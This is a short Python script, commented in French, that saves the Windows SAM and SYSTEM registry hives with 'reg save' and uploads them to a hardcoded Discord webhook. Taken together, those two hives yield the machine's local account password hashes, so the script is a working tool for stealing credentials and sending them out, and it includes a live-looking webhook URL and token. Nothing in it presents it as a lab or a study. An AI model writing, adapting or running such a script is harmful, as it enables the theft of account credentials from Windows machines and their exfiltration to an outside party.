import shutil
import subprocess
import requests
import os

# Sauvegarde des hives du Registre Windows
subprocess.run(['reg', 'save', 'HKLM\SAM', r'C:\sam'], shell=True)
subprocess.run(['reg', 'save', 'HKLM\SYSTEM', r'C:\system'], shell=True)

webhook_url = 'https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h'

# Liste de fichiers à envoyer
files = [('file1', ('sam', open('C:/sam', 'rb'))), ('file2', ('system', open('C:/system', 'rb')))]


data = {'content': 'Here are the files you requested.'}

# Envoi des fichiers au webhook Discord
try:
    response = requests.post(webhook_url, data=data, files=files)
    response.raise_for_status()
    print("Files successfully sent to Discord.")
except requests.exceptions.RequestException as err:
    print(f"Error sending files to Discord: {err}")
finally:
    # Fermeture des fichiers
    for _, file_data in files:
        file_data[1].close()
